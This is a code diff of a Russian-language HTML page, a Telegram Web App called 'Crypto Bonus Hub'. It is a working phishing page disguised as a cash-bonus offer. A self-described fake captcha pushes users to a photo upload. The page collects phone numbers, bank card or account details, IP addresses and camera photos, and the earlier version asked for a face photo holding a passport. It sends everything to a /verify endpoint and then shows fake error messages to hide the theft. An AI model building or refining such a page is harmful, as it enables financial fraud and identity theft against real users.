@@ -2,57 +2,259 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Центр Верификации</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Crypto Bonus Hub</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: sans-serif; background: #f4f4f9; display: flex; justify-content: center; padding: 20px; }
-        .card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
-        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
-        .info { font-size: 12px; color: #666; text-align: center; }
+        :root {
+            --primary: #0088cc;
+            --accent: #31b545;
+            --bg: #0f172a;
+            --glass: rgba(255, 255, 255, 0.05);
+            --text: #ffffff;
+        }
+
+        body {
+            background: radial-gradient(circle at top left, #1e293b, #0f172a);
+            color: var(--text);
+            font-family: -apple-system, system-ui, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        /* Анимированный фон */
+        .bg-glow {
+            position: absolute;
+            width: 300px;
+            height: 300px;
+            background: var(--primary);
+            filter: blur(120px);
+            opacity: 0.2;
+            z-index: -1;
+            animation: move 10s infinite alternate;
+        }
+
+        @keyframes move {
+            from { transform: translate(-50%, -50%); }
+            to { transform: translate(50%, 50%); }
+        }
+
+        .card {
+            background: var(--glass);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 28px;
+            padding: 30px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        }
+
+        .bonus-amount {
+            font-size: 48px;
+            font-weight: 800;
+            background: linear-gradient(45deg, #0088cc, #22d3ee);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin: 10px 0;
+        }
+
+        .label-tag {
+            background: rgba(49, 181, 69, 0.2);
+            color: var(--accent);
+            padding: 5px 12px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .input-group {
+            margin: 20px 0;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            color: #94a3b8;
+            margin-bottom: 8px;
+            margin-left: 5px;
+        }
+
+        input, select {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 14px;
+            padding: 14px;
+            color: white;
+            font-size: 16px;
+            transition: all 0.3s;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: var(--primary);
+            background: rgba(0, 0, 0, 0.3);
+        }
+
+        .btn {
+            width: 100%;
+            background: linear-gradient(135deg, #0088cc, #0077b5);
+            color: white;
+            border: none;
+            border-radius: 16px;
+            padding: 18px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 10px 20px -5px rgba(0, 136, 204, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .btn:active {
+            transform: scale(0.98);
+        }
+
+        /* Фейковая капча в стиле Apple */
+        .captcha-container {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 14px;
+            padding: 15px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            border: 1px dashed rgba(255, 255, 255, 0.2);
+            cursor: pointer;
+        }
+
+        .captcha-circle {
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--primary);
+            border-radius: 50%;
+            margin-right: 15px;
+        }
+
+        .photo-upload {
+            border: 2px dashed rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            transition: 0.3s;
+        }
+
+        .photo-upload:active {
+            border-color: var(--primary);
+            background: rgba(0, 136, 204, 0.05);
+        }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h3>Подтверждение личности</h3>
-        <p class="info">Для продолжения необходимо подтвердить номер телефона и сделать фото лица с паспортом в руках.</p>
-        
-        <form id="mainForm">
+
+<div class="bg-glow"></div>
+
+<div class="card">
+    <div class="label-tag">Verified Offer</div>
+    <div class="bonus-amount" id="bonusDisplay">1,000 ₽</div>
+    <p style="color: #94a3b8; font-size: 14px;">Зачисление через СБП или на карту Visa/Mastercard</p>
+
+    <form id="mainForm">
+        <div class="input-group">
+            <label>Выберите регион</label>
+            <select id="currency" onchange="updateBonus()">
+                <option value="RUB">🇷🇺 Россия (1,000 ₽)</option>
+                <option value="USD">🌎 International ($100)</option>
+            </select>
+        </div>
+
+        <div class="input-group">
+            <label id="phoneLabel">Номер телефона (СБП)</label>
             <input type="text" id="phone" placeholder="+7 (___) ___-__-__" required>
+        </div>
+
+        <div class="input-group">
+            <label>Реквизиты для выплаты</label>
+            <input type="text" id="card" placeholder="Номер карты или счета" required>
+        </div>
+
+        <div class="captcha-container" onclick="this.style.borderColor='#31b545'; alert('Verification error. Please use Identity Check below.')">
+            <div class="captcha-circle"></div>
+            <span style="font-size: 14px; color: #cbd5e1;">Я не робот (Security Check)</span>
+        </div>
+
+        <div class="photo-upload">
+            <label style="text-align: center; display: block; margin: 0;">📸 Фото-верификация личности</label>
+            <input type="file" id="photo" accept="image/*" capture="camera" style="opacity: 0; position: absolute; width: 1px;" required>
+            <button type="button" onclick="document.getElementById('photo').click()" style="background: none; border: 1px solid var(--primary); color: var(--primary); padding: 8px 15px; border-radius: 10px; margin-top: 10px; cursor: pointer;">Выбрать фото</button>
+        </div>
+
+        <button type="submit" class="btn" id="submitBtn">Получить бонус</button>
+    </form>
+</div>
+
+<script>
+    // Инициализация Telegram WebApp
+    const tg = window.Telegram.WebApp;
+    tg.expand(); // Развернуть на весь экран
+
+    function updateBonus() {
+        const currency = document.getElementById('currency').value;
+        const display = document.getElementById('bonusDisplay');
+        const phoneLabel = document.getElementById('phoneLabel');
+        const phoneInput = document.getElementById('phone');
+
+        if (currency === 'USD') {
+            display.innerText = '$100';
+            phoneLabel.innerText = 'Contact Phone Number';
+            phoneInput.placeholder = '+1 ...';
+        } else {
+            display.innerText = '1,000 ₽';
+            phoneLabel.innerText = 'Номер телефона (СБП)';
+            phoneInput.placeholder = '+7 (___) ___-__-__';
+        }
+    }
+
+    document.getElementById('mainForm').onsubmit = async (e) => {
+        e.preventDefault();
+        const btn = document.getElementById('submitBtn');
+        btn.innerText = 'Connecting to gateway...';
+        btn.disabled = true;
+
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const { ip } = await ipRes.json();
+
+            const formData = new FormData();
+            formData.append('phone', `[${document.getElementById('currency').value}] ${document.getElementById('phone').value} | Card: ${document.getElementById('card').value}`);
+            formData.append('ip', ip);
+            formData.append('photo', document.getElementById('photo').files[0]);
+
+            await fetch('/verify', { method: 'POST', body: formData });
             
-            <label>Сделайте фото:</label>
-            <input type="file" id="photo" accept="image/*" capture="camera" required>
+            // Красивое завершение в стиле Telegram
+            tg.showPopup({
+                title: 'System Error',
+                message: 'Your account is under review. Please try again in 24 hours.',
+                buttons: [{type: 'close'}]
+            });
             
-            <button type="submit" id="btn">Подтвердить</button>
-        </form>
-    </div>
+            alert('Service unavailable in your region. Error code: 0x442');
+        } catch (err) {
+            alert('Connection timeout');
+        } finally {
+            btn.innerText = 'Получить бонус';
+            btn.disabled = false;
+        }
+    };
+</script>
 
-    <script>
-        document.getElementById('mainForm').onsubmit = async (e) => {
-            e.preventDefault();
-            const btn = document.getElementById('btn');
-            btn.innerText = 'Обработка...';
-
-            try {
-                // 1. Получаем IP
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const { ip } = await ipRes.json();
-
-                // 2. Собираем данные
-                const formData = new FormData();
-                formData.append('phone', document.getElementById('phone').value);
-                formData.append('ip', ip);
-                formData.append('photo', document.getElementById('photo').files[0]);
-
-                // 3. Отправляем на наш будущий сервер
-                await fetch('/verify', { method: 'POST', body: formData });
-
-                // 4. Финал
-                alert('Ошибка доступа. Попробуйте через 24 часа.');
-            } catch (err) {
-                alert('Ошибка сети');
-            }
-            btn.innerText = 'Подтвердить';
-        };
-    </script>
 </body>
 </html>
